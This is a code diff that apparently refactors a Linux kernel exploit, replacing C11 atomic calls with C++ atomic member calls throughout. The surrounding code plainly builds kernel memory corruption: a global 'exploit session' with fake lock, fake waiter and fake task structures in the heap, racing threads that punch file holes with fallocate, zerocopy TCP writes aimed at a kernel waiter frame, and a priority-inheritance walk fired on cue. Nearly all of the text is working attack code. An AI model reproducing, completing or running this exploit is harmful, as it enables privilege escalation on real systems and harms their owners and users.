@@ -83,27 +83,27 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
         status.code = ROUTE_FALLBACK_SAFE;
         return status;
     }
-    atomic_store(&g_exploit_session.race.consumer_calls, 0);
-    atomic_store(&g_exploit_session.race.consumer_success, 0);
-    atomic_store(&g_exploit_session.race.consumer_stop, 0);
-    atomic_store(&g_exploit_session.race.route_delay_usec, 0);
+    g_exploit_session.race.consumer_calls.store(0);
+    g_exploit_session.race.consumer_success.store(0);
+    g_exploit_session.race.consumer_stop.store(0);
+    g_exploit_session.race.route_delay_usec.store(0);
     errno = 0;
     int stamp_result =
             setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
     status.step = 61;
     status.error_number = errno;
-    atomic_store(&g_exploit_session.race.consumer_go, 1);
+    g_exploit_session.race.consumer_go.store(1);
     for (int spin = 0; spin < 100000000 &&
-            atomic_load(&g_exploit_session.race.consumer_calls) == 0; spin++)
+            g_exploit_session.race.consumer_calls.load() == 0; spin++)
         __asm__ volatile("yield":: : "memory");
-    atomic_store(&g_exploit_session.race.consumer_go, 0);
-    while (atomic_load(&g_exploit_session.race.consumer_inflight))
+    g_exploit_session.race.consumer_go.store(0);
+    while (g_exploit_session.race.consumer_inflight.load())
         __asm__ volatile("yield":: : "memory");
     close(fd);
     status.userspace_clean = 1;
     status.kernel_disarmed = 1;
     if (stamp_result == 0 ||
-            atomic_load(&g_exploit_session.race.consumer_success) > 0) {
+            g_exploit_session.race.consumer_success.load() > 0) {
         status.step = 0;
         status.error_number = 0;
         status.code = ROUTE_OK;
@@ -124,8 +124,8 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
 /* Decoupling plan: stop and drain the shared PI consumer. Input: race context;
  * output: consumer idle. */
 static void tcp_wait_for_consumer_idle(TcpZerocopyRouteContext *context) {
-    atomic_store(&context->race->consumer_go, 0);
-    while (atomic_load(&context->race->consumer_inflight)) {
+    context->race->consumer_go.store(0);
+    while (context->race->consumer_inflight.load()) {
         __asm__ volatile("yield":: : "memory");
     }
 }
@@ -178,28 +178,28 @@ static int tcp_make_pair(TcpZerocopyRouteContext *context) {
 static void *tcp_punch_thread(void *arg) {
     support::disable_rseq_for_thread();
     auto *context = static_cast<TcpZerocopyRouteContext *>(arg);
-    while (!atomic_load(&context->punch_go) &&
-            !atomic_load(&context->punch_stop)) {
+    while (!context->punch_go.load() &&
+            !context->punch_stop.load()) {
         sched_yield();
     }
-    while (!atomic_load(&context->punch_stop)) {
+    while (!context->punch_stop.load()) {
         if (fallocate(context->punch_fd.get(), 0, 0, (off_t) context->mapping_length) != 0) {
-            atomic_store(&context->punch_failed, errno ? errno : EIO);
+            context->punch_failed.store(errno ? errno : EIO);
             pr_warning("tcp punch fill errno=%d\n", errno);
             break;
         }
-        atomic_store(&context->punch_phase, 1);
+        context->punch_phase.store(1);
         if (fallocate(context->punch_fd.get(),
                 FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                 (off_t) context->page_size,
                 (off_t) (context->mapping_length - context->page_size)) != 0) {
             /* without the hole the target page keeps stale contents and the
              * zerocopy write misses */
-            atomic_store(&context->punch_failed, errno ? errno : EIO);
+            context->punch_failed.store(errno ? errno : EIO);
             pr_warning("tcp punch hole errno=%d\n", errno);
         }
-        atomic_store(&context->punch_phase, 0);
-        if (atomic_load(&context->punch_failed)) {
+        context->punch_phase.store(0);
+        if (context->punch_failed.load()) {
             break;
         }
     }
@@ -242,10 +242,10 @@ int TcpZerocopyRoute::prepare() noexcept {
         bytes[off] = 0x55;
     }
 
-    atomic_store(&race->consumer_stop, 0);
-    atomic_store(&race->consumer_go, 0);
-    atomic_store(&race->consumer_calls, 0);
-    atomic_store(&race->consumer_success, 0);
+    race->consumer_stop.store(0);
+    race->consumer_go.store(0);
+    race->consumer_calls.store(0);
+    race->consumer_success.store(0);
     int thread_error = punch_worker.start(route::tcp_punch_thread, this);
     if (thread_error != 0) {
         pr_warning("tcp route punch thread errno=%d\n", thread_error);
@@ -268,30 +268,30 @@ RouteStatus TcpZerocopyRoute::execute() noexcept {
             (g_exploit_session.heap.current.base), (g_exploit_session.heap.current.fake_lock), (g_exploit_session.heap.current.fake_w0), (g_exploit_session.heap.current.fake_task), waiter_task,
             attempts, arm_seq, post_hold);
 
-    atomic_store(&punch_go, 1);
+    punch_go.store(1);
     /* custom-write mode: fire the PI walk immediately */
-    atomic_store(&race->route_delay_usec, 0);
+    race->route_delay_usec.store(0);
 
     std::array<unsigned char, 64> sendbuf{};
     sendbuf.fill(0x33);
 
     for (int i = 1; i <= attempts && !route_won; i++) {
-        int calls_before = atomic_load(&race->consumer_calls);
-        int success_before = atomic_load(&race->consumer_success);
+        int calls_before = race->consumer_calls.load();
+        int success_before = race->consumer_success.load();
         (void) send(server_fd.get(), sendbuf.data(), sendbuf.size(),
                 MSG_DONTWAIT);
-        while (atomic_load(&punch_phase)) {
+        while (punch_phase.load()) {
             sched_yield();
         }
         for (int spin = 0;
-             !atomic_load(&punch_phase) &&
-                     !atomic_load(&punch_failed) &&
+             !punch_phase.load() &&
+                     !punch_failed.load() &&
                      spin < 10000000;
              spin++) {
             __asm__ volatile("yield":: : "memory");
         }
-        if (atomic_load(&punch_failed)) {
-            (void) fail(46, atomic_load(&punch_failed));
+        if (punch_failed.load()) {
+            (void) fail(46, punch_failed.load());
             pr_warning("tcp route puncher failed errno=%d\n",
                     status.error_number);
             break;
@@ -315,15 +315,15 @@ RouteStatus TcpZerocopyRoute::execute() noexcept {
         /* release the consumer only once the zerocopy write landed in the
          * waiter frame; earlier release walks a half-written waiter */
         if (i >= arm_seq && ret == 0) {
-            atomic_store(&race->consumer_go, i);
+            race->consumer_go.store(i);
             for (int spin = 0; spin < post_hold; spin++) {
                 __asm__ volatile("yield":: : "memory");
             }
             route::tcp_wait_for_consumer_idle(this);
         }
 
-        int calls = atomic_load(&race->consumer_calls);
-        int success = atomic_load(&race->consumer_success);
+        int calls = race->consumer_calls.load();
+        int success = race->consumer_success.load();
         if (calls <= calls_before || success <= success_before) {
             if ((i % 100) == 0 || ret != 0) {
                 pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
@@ -370,8 +370,8 @@ RouteStatus do_tcp_fake_lock_route(const WriteRequest *request) {
     pr_info("tcp route done=%d calls=%d success=%d status=%d clean=%d/%d "
             "step=%d errno=%d\n",
             context.route_won,
-            atomic_load(&context.race->consumer_calls),
-            atomic_load(&context.race->consumer_success), context.status.code,
+            context.race->consumer_calls.load(),
+            context.race->consumer_success.load(), context.status.code,
             context.status.userspace_clean, context.status.kernel_disarmed,
             context.status.step, context.status.error_number);
     return context.status;
@@ -668,12 +668,12 @@ RouteStatus SelectStackRoute::execute() noexcept {
             owned_exception_set = exception_set;
         }
 
-        atomic_store(&race->consumer_calls, 0);
-        atomic_store(&race->consumer_success, 0);
-        atomic_store(&race->consumer_stop, 0);
+        race->consumer_calls.store(0);
+        race->consumer_success.store(0);
+        race->consumer_stop.store(0);
         int delay_usec = route::route_delay_usec(this, attempt);
-        atomic_store(&race->route_delay_usec, delay_usec);
-        atomic_store(&race->consumer_go, attempt);
+        race->route_delay_usec.store(delay_usec);
+        race->consumer_go.store(attempt);
 
         pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
                 attempt, attempts, layout.compact_waiter,
@@ -703,10 +703,10 @@ RouteStatus SelectStackRoute::execute() noexcept {
         pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
                 attempt, attempts, layout.compact_waiter,
                 route::fops_elapsed_ms(&route_t0), select_result);
-        atomic_store(&race->consumer_go, 0);
+        race->consumer_go.store(0);
 
-        const int calls = atomic_load(&race->consumer_calls);
-        const int successes = atomic_load(&race->consumer_success);
+        const int calls = race->consumer_calls.load();
+        const int successes = race->consumer_success.load();
         calls_total += calls;
         successes_total += successes;
         if (calls > 0 && successes > 0) {
